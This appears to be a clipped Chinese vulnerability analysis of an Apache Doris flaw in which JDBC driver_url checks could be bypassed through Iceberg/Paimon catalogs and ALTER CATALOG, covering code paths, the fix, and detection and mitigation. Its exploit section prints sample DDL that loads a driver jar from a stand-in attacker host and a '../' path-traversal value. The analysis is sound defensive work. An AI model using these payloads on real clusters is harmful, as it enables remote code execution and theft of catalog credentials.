---
title: 【微信】Apache Doris JDBC driver_url 校验绕过 RCE 代码分析：同一个 sink，三条漏网的路
source: https://mp.weixin.qq.com/s/xlpj9dKGV_6kzm4tHx1L2A
source_host: mp.weixin.qq.com
clip_date: 2026-11-24T03:56:39+08:00
trace_id: adf0a98a-009d-42e1-8942-ebf0462356cf
content_hash: aed161b0dac461bd8239dcdaeb381b7ed64f4e407f9b9651c7f9a02cef61cea7
status: synced
tags:
  - 微信
  - 漏洞分析
  - 代码审计
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: Apache Doris 的 JDBC `driver_url` 校验只覆盖普通 JDBC Catalog 的 CREATE；Iceberg/Paimon 的 CREATE 和三种 Catalog 的 ALTER 都能绕过校验，仅凭一条 DDL 就能在 FE 进程内加载任意 jar，4.1.4 已修复。
ai_summary_style: key-points
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 42175244-d011-8123-93c6-c48091de1a63
ioc:
  cves:
    - CVE-2026-96443
  cwes:
    - CWE-829
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> Apache Doris 的 JDBC `driver_url` 校验只覆盖普通 JDBC Catalog 的 CREATE；Iceberg/Paimon 的 CREATE 和三种 Catalog 的 ALTER 都能绕过校验，仅凭一条 DDL 就能在 FE 进程内加载任意 jar，4.1.4 已修复。
> 
> - **sink 本质：** CVE-2026-96443（CWE-829）影响 2.0.5–4.1.3；`driver_url` 最终交给 `URLClassLoader.newInstance` 交给 HikariCP 的 `Class.forName`，jar 静态块在 FE 的 JVM 里执行；FE 掌控元数据与全部 Catalog 凭据，一旦失守整个集群就失守。
> - **原有两层防护：** 强制规则拒绝任何 `..` 段（在解码后路径上判断，`%2e%2e` 绕不过），并且没有 scheme 的值必须匹配裸 jar 名 `[A-Za-z0-9._-]+\.jar`；运维门禁 `jdbc_driver_secure_path` / `jdbc_driver_url_white_list` 可配，但默认值为 `*` 全放行。
> - **三处未覆盖的绕过路径：** Iceberg/Paimon 的 jdbc driver_url 走 connector 侧的 `JdbcDriverSupport.resolveDriverUrl`，从未执行强制规则；三种 Catalog 的 ALTER 走 `validatePropertiesBeforeUpdate`，到不了 `preCreateValidation`，两层检查全无；`resetToUninitialized` 让新属性在下一次元数据访问即生效。
> - **修复设计：** PR #68129/#68164 把规则收敛为 `fe-foundation` 的 `JdbcDriverUrlSecurity`，挂进属性 holder 的语句时校验钩子（从而覆盖 CREATE 与 ALTER，且 edit-log 回放、catalog 重建时不执行）；ALTER 侧新增 `checkDriverUrlsAgainstOperatorGate`，仅当改动 driver_url 相关键或可激活存量值的 flavor 键时才检查。
> - **自查与处置：** 排查 audit log 中 `driver_url` 含外部 http(s) 域名或 `..` 段、`jdbc_drivers_dir` 出现非官方 jar、FE 向未知域名出网；根治靠升级，临时措施为收紧 secure_path、回收 `CREATE CATALOG` 权限、给 FE 出网加白名单，并全量审计 `SHOW CATALOGS` 属性。

**Kratos Sec** *2026年11月20日 18:18*

用 Doris 做湖仓一体的团队对 JDBC Catalog 都不陌生：配一个 `driver_url` 指向驱动 jar，FE 就能直连 MySQL、Oracle、达梦这些外部库。9 月 23 日，Apache 官方给这个功能挂了 CVE-2026-96443——JDBC 驱动 URL 校验不足，特权用户可在 FE 上 RCE，影响 2.0.5 到 4.1.3 全线。

"特权用户才能打"是它只评了 moderate 的原因，但别急着关页面：Doris 集群里 `CREATE CATALOG` 权限往往下放给分析师做临时数据源接入，而这个漏洞的实质是 **一行 DDL 属性换一个 FE 进程**。修复 PR 里有一句话值得裱起来："the property's effective privilege is that process, not the DDL privilege it was gated on"——属性的真实权限是加载它的那个进程，不是授予它的那条 DDL。

这篇按老规矩讲清楚三件事：sink 长什么样、防了什么又漏了什么、4.1.4 是怎么把三条路一起堵上的。

## 0x0 事件概述

| 项目  | 内容  |
| --- | --- |
| 编号  | CVE-2026-96443（CWE-829，不可信控制域的功能包含） |
| 标题  | Apache Doris: JDBC driver URL validation bypass leads to remote code execution |
| 评分  | moderate（官方文字评级，未给 CVSS 分值） |
| 影响  | 2.0.5 ≤ Apache Doris ≤ 4.1.3 |
| 前提  | 具备 CREATE / ALTER CATALOG 权限的用户 |
| 修复  | PR #68129（master）+ #68164（branch-4.1），2026-09-18 合入；随 4.1.4 发布 |
| 披露  | 2026-09-23，Apache 官方公告 + CVE 记录 |

时间线上有个细节：补丁合入（9 月 18 日）比 CVE 公开（9 月 23 日）早五天，走了先修后曝的正常流程。官方公告在 lists.apache.org 的邮件线程里，信息量不大，真正的细节全在 PR 描述和 diff 里。

## 0x1 sink：FE 自己的 JVM 里加载用户给的 jar

先看终点。JDBC Catalog 初始化连接客户端时， `driver_url` 的旅程：

```typescript
// fe-connector-jdbc/.../client/JdbcConnectorClient.java
private static String resolveDriverUrl(String driverUrl) {
    if (driverUrl.startsWith("file://") || driverUrl.startsWith("http://")
            || driverUrl.startsWith("https://")) {
        return driverUrl;                    // 远程 URL 原样放行
    }
    return "file://" + driverUrl;            // 裸文件名拼进 file://
}

static ClassLoader getOrCreateDriverClassLoader(URL url) {
    return CLASS_LOADER_MAP.computeIfAbsent(url, key ->
            URLClassLoader.newInstance(new URL[]{key}, JdbcConnectorClient.class.getClassLoader()));
}
```

拿到 ClassLoader 之后，驱动类的实例化走 HikariCP：

```
Thread.currentThread().setContextClassLoader(this.classLoader);   // L233
...
dataSource.setDriverClassName(driverClass);                       // L241 → Class.forName
```

也就是说， `driver_url` 指向哪个 jar、 `driver_class` 写哪个类名，都由建 Catalog 的人决定，jar 里的静态代码块会在 **FE 进程** 里执行。FE 掌着元数据、账号和所有 Catalog 凭据——这里被 RCE 等于整个集群失守。这个 sink 本身是 JDBC Catalog 的设计使然，问题从来不在 sink 存在，而在 **谁被允许往里塞 jar、校验有没有被绕过**。

## 0x2 修复前的两层防御，和它们罩不住的三个面

修复前，引擎其实已经补过一轮。针对普通 JDBC Catalog 的 CREATE，存在两层检查：

**第一层，强制规则** （不可关闭，仅 CREATE 时执行）：

```javascript
// 修复前 JdbcDorisConnector.checkDriverUrlSecurityRule（本次 PR 中被抽走重构）
// 1. 任何 .. 路径段直接拒绝（file:// 和 http(s) 一视同仁，且在解码后的路径上检查，
//    %2e%2e 编码绕不过）
for (String segment : probe.split("/")) {
    if ("..".equals(segment)) { throw new IllegalArgumentException(...); }
}
// 2. 不带 scheme 的值必须是裸 jar 文件名 [A-Za-z0-9._-]+\.jar，禁止任何路径分隔符
if (!driverUrl.contains("://")) {
    if (!SAFE_DRIVER_FILE_NAME.matcher(driverUrl).matches()) { throw ...; }
}
```

**第二层，运维门禁** （fe.conf 可配）： `jdbc_driver_secure_path` / `jdbc_driver_url_white_list` ，控制远程/绝对 URL 是否允许。

看起来挺全。但 2026 年的 Doris 早就不是只有一种 JDBC Catalog 了，两个缺口由此而来。

**缺口一：Iceberg JDBC 和 Paimon JDBC Catalog 从没跑过强制规则。** `iceberg.catalog.type=jdbc` / `paimon.catalog.type=jdbc` 时， `iceberg.jdbc.driver_url` 、 `jdbc.driver_url` 这些属性走的是 connector 侧的 `JdbcDriverSupport.resolveDriverUrl` ，同样能到达 class-loading sink——但强制规则只写在普通 JDBC 的 connector 里。它们的 CREATE 流程只过了运维门禁，而 `jdbc_driver_secure_path` **默认值是 `*` （全放行）**。默认配置下，攻击面就是一条 `..` 穿越：connector 把相对路径往驱动目录上解析，`../` 一路走出去，指到任何可达的 jar。

**缺口二：三种 Catalog 的 ALTER CATALOG 都不跑任何检查。** ALTER 的校验走 `PluginDrivenExternalCatalog.validatePropertiesBeforeUpdate` ，到不了 CREATE 用的 `Connector.preCreateValidation` ——两层检查全都住在后者里。修完的 PR 描述里给了现成的攻击叙事：

> an operator who narrowed `jdbc_driver_secure_path` got the restriction enforced at `CREATE CATALOG` and silently bypassed by a follow-up `ALTER CATALOG ... SET ("driver_url" = ...)`

而 `resetToUninitialized` 会让新属性在下一次元数据访问时生效——改完 Catalog，查一下，jar 就加载了。更扎心的是 Paimon connector 自己的 javadoc 早就把这个写成已知问题："shared by all plugin connectors"（所有插件式 connector 共有的缺口）。

整理成一张表：

| 路径  | 强制规则（.. / 裸文件名） | 运维门禁（secure_path） |
| --- | --- | --- |
| JDBC Catalog · CREATE | 有   | 有   |
| JDBC Catalog · ALTER | **无** | **无** |
| Iceberg/Paimon JDBC · CREATE | **无** | 有，但默认 `*` 形同虚设 |
| Iceberg/Paimon JDBC · ALTER | **无** | **无** |

sink 只有一个，通向 sink 的路有四条，修复前只有一条是完整的。这就是 CVE 标题里 "validation bypass" 的准确含义：不是没有校验，是校验没有覆盖到所有入口。

## 0x3 利用形态

利用形态非常"朴素"，因为它本来就是个合法功能的越权使用：

```sql
-- 形态一：远程 jar 直接喂给 FE（默认 secure_path=* 时，
--         iceberg/paimon 的 CREATE 以及三种 catalog 的 ALTER 都收）
CREATE CATALOG poc PROPERTIES (
    "type" = "jdbc",
    "user" = "root", "password" = "...",
    "jdbc_uri" = "jdbc:mysql://127.0.0.1:3306/test",
    "driver_url" = "http://attacker.example/x.jar",   -- 恶意驱动 jar
    "driver_class" = "..."                             -- 类名与 jar 内对应
);

-- 形态二：穿越段绕过解析（iceberg/paimon 路径）
"iceberg.jdbc.driver_url" = "../../../../tmp/x.jar"

-- 生效：ALTER 后查询或 SWITCH 触发元数据访问 → FE 初始化连接客户端 → 加载
```

恶意 jar 的构造点本文不展开，只说结论性的：驱动类的静态初始化块在类加载时执行，这是所有 JDBC 驱动 RCE 链的通用落点。验证自己的测试集群是否受影响，用一个静态块里写文件/打日志的假驱动 jar 即可，不需要武器化。

## 0x4 修复拆解：把规则搬到属性声明旁边

PR #68129 的修法比"哪里漏了堵哪里"高一个段位，三个动作。

**动作一，强制规则收敛成单一事实源。** 新建 `fe-foundation/.../JdbcDriverUrlSecurity` （foundation 模块是所有属性 holder 的公共依赖），删除 JDBC connector 里的本地副本。调用点放在 **属性 holder 的语句时校验钩子** 里—— `JdbcCatalogProperties.checkCreateTimeOnlyRules` 和 iceberg/paimon 的 metastore holder 的 `validate()` ：

这些钩子天然覆盖 CREATE **和 ALTER**，且在 edit-log 回放、catalog 重建时不执行——老 Catalog 重启后照常加载，follower 启动不会被拦。把校验放在属性声明旁边而不是某个流程节点上，是这次修复最值得抄的设计：流程会分叉，属性只有一个家。

**动作二，ALTER 补上运维门禁。** `PluginDrivenExternalCatalog` 新增 `checkDriverUrlsAgainstOperatorGate` ，用一张三种 Catalog 的 driver-url 属性名键表（含别名、按 flavor 门控）驱动：

```php
boolean touched = keys.urlKeys.stream().anyMatch(updatedProperties::containsKey)
        || (keys.flavorKey != null && updatedProperties.containsKey(keys.flavorKey));
if (!touched) { return; }                 // 只查动了 driver_url / flavor 的 ALTER
...
JdbcDriverUrlSecurity.check(driverUrl);   // 强制规则在此再跑一遍
JdbcResource.getFullDriverUrl(driverUrl); // 运维门禁 + 可达性检查
```

只在 ALTER 触碰 driver_url 相关键（或能把存量值激活的 flavor 键）时才检查——既不放过绕过，也不会在无关 ALTER 上重复触发下载副作用。

**动作三，给后来的开发者立规矩。** AGENTS.md 新增一条工程红线，原文值得整段引用：

> Do not add any new code path that fetches an artifact from a user-supplied URL and loads it into a Doris process... A user who can write such a property gets code execution inside the process that loads it, so the property's effective privilege is that process, not the DDL privilege it was gated on.

把"属性值即进程权限"写进贡献准则，比修一百个具体绕过都值钱。后续的 PR #69588（10 月底）继续把 catalog 的 SSRF 端点和 driver_url 统一收进一个 connector 安全面治理，方向一致。

## 0x5 自查与处置

**暴露面三问。** 版本： `SHOW FRONTENDS` 看 version 列，2.0.5–4.1.3 都在射程；配置： `jdbc_driver_secure_path` / `jdbc_driver_url_white_list` 是否还是默认 `*` ——是的话，iceberg/paimon 的 CREATE 和所有 ALTER 在修复前等于没设防；权限： `CREATE CATALOG` 权限发给了哪些角色，分析师能不能自助建 Catalog。

**失陷痕迹。** 按三条线排查：audit log 里 `CREATE / ALTER CATALOG` 语句的属性值—— `driver_url` 含外部 http(s) 域名、`..` 段或非常见驱动的 jar 名；FE 主机的 `jdbc_drivers_dir` 目录（及被穿越解析到的目录）里出现非官方来源的 jar，核对 mtime；FE 出网流量里 80/443 目的为未知域名的下载行为。FE 进程若失守，按元数据权限面失陷处置——所有 Catalog 凭据视为泄露。

**处置优先级。** 升级到 4.1.4 及以上是根治；升不了先做两件事——fe.conf 把 `jdbc_driver_secure_path` 收紧到受控目录、回收不必要的 `CREATE CATALOG` 权限；网络侧给 FE 的出网做白名单，让"远程 jar"这条路在网络上先死掉。存量 Catalog 建议全量过一遍 `SHOW CATALOGS` + 属性，清掉指向外部 URL 的 driver_url。

**参考**

-   https://lists.apache.org/thread/vv9o8sxpt8kkd7nznhovn9qjojn2wyv9（官方公告）
    
-   https://github.com/apache/doris/pull/68129（修复 PR，含完整威胁描述）
    
-   https://github.com/apache/doris/pull/68164（branch-4.1 backport）
    
-   https://github.com/apache/doris/pull/69588（后续 connector 安全面治理）
    
-   https://www.cve.org/CVERecord?id=CVE-2026-96443
